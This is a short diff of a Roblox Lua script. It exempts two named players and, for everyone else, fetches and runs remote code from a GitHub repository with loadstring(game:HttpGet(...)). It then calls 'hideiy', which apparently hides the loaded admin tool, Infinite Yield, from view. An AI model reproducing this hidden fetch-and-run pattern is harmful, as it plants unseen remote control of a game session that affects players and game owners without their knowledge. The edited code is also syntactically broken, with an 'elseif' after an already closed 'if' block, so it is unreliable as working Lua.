@@ -3,10 +3,10 @@ game.Loaded:Wait()
 
 local lp = game:GetService('Players').LocalPlayer
 
-if lp.Name == "Juneuari" then
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/IY_GUI.lua'))()
-elseif lp.Name == "sjlyant" then 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/IY_GUI.lua'))()
+if lp.Name == "Juneuari" then return end
+--loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/IY_GUI.lua'))()
+elseif lp.Name == "sjlyant" then return end
+--loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/IY_GUI.lua'))()
 else
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/IY.lua'))()
 execCmd('hideiy')
